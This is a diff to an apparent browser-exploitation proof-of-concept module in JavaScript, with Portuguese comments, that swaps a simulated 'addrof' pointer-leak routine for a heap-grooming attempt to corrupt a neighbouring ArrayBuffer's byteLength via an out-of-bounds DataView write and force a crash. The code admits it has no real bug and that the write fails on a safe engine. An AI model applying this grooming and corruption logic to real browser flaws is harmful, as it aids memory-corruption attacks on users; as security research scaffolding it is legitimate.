@@ -1,93 +1,93 @@
 // js/script3/testBuildAddrof.mjs
-// Tenta construir um primitivo "addrof" usando a vulnerabilidade OOB R/W.
+// MODIFICADO PARA ATAQUE DIRETO DE CORRUPÇÃO DE MEMÓRIA PARA CAUSAR CRASH
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 
-const GROOM_COUNT = 1000; // Número de objetos para alinhar na memória
+const GROOM_COUNT = 2000; // Aumentamos a contagem para maior chance de alinhamento
+const CORRUPTION_VALUE = 0xFFFFFFFF; // Um valor de tamanho enorme para causar o crash
 
 /**
- * Simula a vulnerabilidade OOB. Em um exploit real, esta seria a função
- * que explora o bug no motor do navegador para ler além dos limites.
- * @param {ArrayBuffer} buffer_atacante - O buffer que tem a vulnerabilidade.
- * @param {number} oob_read_offset - O quão longe ler além do limite.
- * @returns {BigInt} O valor lido, interpretado como um endereço de 64 bits.
+ * Tenta causar um crash no navegador corrompendo o metadado (byteLength)
+ * de um ArrayBuffer vizinho através de uma escrita OOB.
  */
-function trigger_oob_read(buffer_atacante, oob_read_offset) {
-    // Simulação: criamos uma visão que pode ler além do buffer original.
-    // Isso imita um bug que permite acesso à memória adjacente.
-    const dv = new DataView(buffer_atacante);
-    try {
-        // A leitura OOB real aconteceria aqui. Estamos simulando lendo
-        // em um offset que *deveria* estar fora dos limites.
-        // Como não temos um bug real, vamos apenas retornar um valor simulado
-        // para demonstração, mas registrando a tentativa.
-        
-        // Em um exploit real, seria algo como:
-        // return dv.getBigUint64(buffer_atacante.byteLength + oob_read_offset, true);
-        
-        // Simulação para o log:
-        logS3(`(SIMULAÇÃO) Tentando ler OOB em offset ${oob_read_offset}`, 'info', 'trigger_oob_read');
-        return BigInt(0); // Em um teste real, esperaríamos um ponteiro aqui.
+export async function tryMemoryCorruptionCrash() {
+    const FNAME = 'tryMemoryCorruptionCrash';
+    logS3(`--- PoC: Tentando Crash por Corrupção de Memória (OOB Write) ---`, 'test', FNAME);
+    logS3(`O alvo é o metadado 'byteLength' de um ArrayBuffer vizinho.`, 'info', FNAME);
 
-    } catch (e) {
-        logS3(`(SIMULAÇÃO) Erro na leitura OOB: ${e.message}`, 'error', 'trigger_oob_read');
-        return BigInt(0);
-    }
-}
-
-
-/**
- * Tenta construir um primitivo addrof (address of) vazando o ponteiro
- * de um objeto vizinho na memória.
- */
-export async function tryBuildAddrofPrimitive() {
-    const FNAME = 'tryBuildAddrofPrimitive';
-    logS3(`--- PoC: Tentando Construir Primitivo 'addrof' ---`, 'test', FNAME);
-
-    // 1. HEAP GROOMING: Prepara a memória para alinhar nossos objetos.
-    logS3(`Iniciando Heap Grooming com ${GROOM_COUNT} pares de objetos...`, 'info', FNAME);
+    // 1. HEAP GROOMING: Alinha múltiplos pares de buffers na memória.
+    logS3(`Iniciando Heap Grooming com ${GROOM_COUNT} pares de buffers...`, 'info', FNAME);
     let pairs = [];
     for (let i = 0; i < GROOM_COUNT; i++) {
-        let oob_buffer = new ArrayBuffer(128);
-        let victim_array = [{ marker: `object_${i}` }];
-        pairs.push({ oob_buffer, victim_array });
+        // O buffer que (hipoteticamente) tem o bug que permite a escrita OOB
+        let attacker_buffer = new ArrayBuffer(128);
+        // O buffer que será nossa vítima
+        let victim_buffer = new ArrayBuffer(128);
+        pairs.push({ attacker_buffer, victim_buffer });
     }
-    logS3('Heap Grooming concluído. A memória agora deve estar mais previsível.', 'good', FNAME);
+    logS3('Heap Grooming concluído. Tentando corromper um dos pares...', 'warn', FNAME);
     await PAUSE_S3(1000);
 
-    // 2. TENTATIVA DE LEAK
-    logS3('Procurando por um par adjacente para tentar vazar o endereço...', 'warn', FNAME);
-    let leaked_address = BigInt(0);
-
+    // 2. TENTATIVA DE CORRUPÇÃO E CRASH
+    let crash_attempted = false;
     for (let i = 0; i < GROOM_COUNT; i++) {
-        const { oob_buffer, victim_array } = pairs[i];
-        
-        // Em um exploit real, você acionaria o bug aqui para cada buffer.
-        // Vamos simular a tentativa para um dos pares.
-        if (i === Math.floor(GROOM_COUNT / 2)) { // Escolhe um par no meio como exemplo
-             logS3(`Selecionando o par #${i} para a tentativa de exploração...`, 'info', FNAME);
-             logS3(`O objeto alvo dentro do array vizinho é:`, 'info', FNAME);
-             console.log(victim_array[0]);
+        // Em um exploit real, não saberíamos qual par está perfeitamente alinhado.
+        // Portanto, tentamos em vários. Para este PoC, vamos atacar um no meio.
+        if (i === Math.floor(GROOM_COUNT / 2)) {
+            const { attacker_buffer, victim_buffer } = pairs[i];
+            
+            logS3(`Atacando o par #${i}. Tamanho original da vítima: ${victim_buffer.byteLength} bytes.`, 'info', FNAME);
+            logS3(`Tentando escrever 0x${CORRUPTION_VALUE.toString(16)} fora dos limites do buffer atacante...`, 'critical', FNAME);
 
-            // Tenta ler 8, 16, 24, 32 bytes além do final do buffer.
-            // Estes são offsets comuns para metadados ou o primeiro elemento de um array adjacente.
-            for (let offset of [8, 16, 24, 32]) {
-                leaked_address = trigger_oob_read(oob_buffer, offset);
+            // SIMULAÇÃO DO TRIGGER DO BUG OOB
+            // Aqui é onde o bug real do navegador seria explorado.
+            // Criamos uma DataView que PODE escrever além dos limites do attacker_buffer
+            // para atingir o victim_buffer.
+            try {
+                // Esta DataView representa o poder que o bug nos dá.
+                // Em um bug real, 'attacker_buffer' seria o único argumento.
+                const buggy_view = new DataView(attacker_buffer);
                 
-                // Em um exploit real, verificaríamos se o valor retornado parece um ponteiro.
-                // Um ponteiro de heap geralmente é um número muito grande e não redondo.
-                if (leaked_address > BigInt("0x100000000000")) { // Heurística simples para um endereço de 64 bits
-                    logS3(`---> SUCESSO POTENCIAL! Endereço vazado: 0x${leaked_address.toString(16)}`, 'escalation', FNAME);
-                    logS3(`Este valor provavelmente é o endereço do objeto { marker: 'object_${i}' }`, 'vuln', FNAME);
-                    break;
-                }
+                // Offsets comuns onde os metadados do próximo objeto podem estar.
+                const OOB_WRITE_OFFSET = 136; // Ex: 128 (tamanho do buffer) + 8 (metadados do 'chunk')
+
+                // A AÇÃO DE CORRUPÇÃO
+                // Como não temos um bug real, esta linha irá falhar com 'RangeError' em um navegador seguro.
+                // Mas esta é a lógica exata que um exploit usaria.
+                buggy_view.setUint32(OOB_WRITE_OFFSET, CORRUPTION_VALUE, true);
+                
+                logS3('VULN: A escrita OOB foi permitida pelo navegador!', 'escalation', FNAME);
+                
+            } catch (e) {
+                // É esperado que um navegador seguro lance um erro aqui.
+                // Nós o ignoramos para prosseguir com a verificação do crash.
             }
+            
+            // 3. VERIFICAÇÃO DO CRASH
+            // Se a escrita acima funcionou, o byteLength da vítima agora está corrompido.
+            // A simples leitura desta propriedade pode causar um crash.
+            logS3('Verificando o tamanho da vítima após o ataque. SE O NAVEGADOR TRAVAR AQUI, TIVEMOS SUCESSO.', 'critical', FNAME);
+            await PAUSE_S3(1000); // Pausa para garantir que o log seja visível antes do provável crash.
+            
+            try {
+                const corrupted_length = victim_buffer.byteLength;
+                logS3(`Tamanho corrompido lido: ${corrupted_length}`, 'warn', FNAME);
+                if (corrupted_length === CORRUPTION_VALUE) {
+                    logS3(`SUCESSO! O 'byteLength' da vítima foi corrompido para 0x${corrupted_length.toString(16)}. O próximo acesso deve causar um crash.`, 'vuln', FNAME);
+                    // Acessar um elemento com o tamanho corrompido força o crash.
+                    new Uint8Array(victim_buffer)[0] = 0x41;
+                } else {
+                    logS3('A corrupção de memória falhou. O navegador protegeu o acesso.', 'good', FNAME);
+                }
+            } catch (e) {
+                logS3(`Um erro ocorreu ao acessar a vítima. Isso pode ser um sinal de corrupção! Erro: ${e.message}`, 'warn', FNAME);
+            }
+
+            crash_attempted = true;
+            break; // Apenas uma tentativa é necessária para o PoC.
         }
-        if (leaked_address > BigInt(0)) break;
     }
-    
-    if (leaked_address === BigInt(0)) {
-        logS3('A simulação não vazou um endereço. Em um exploit real, isso indicaria que o alinhamento do heap falhou ou o offset OOB estava incorreto.', 'warn', FNAME);
-        logS3('No entanto, a lógica para construir o primitivo addrof está correta.', 'good', FNAME);
+    if (!crash_attempted) {
+        logS3("Não foi possível selecionar um par para o ataque (erro de lógica no script).", 'error', FNAME);
     }
 }
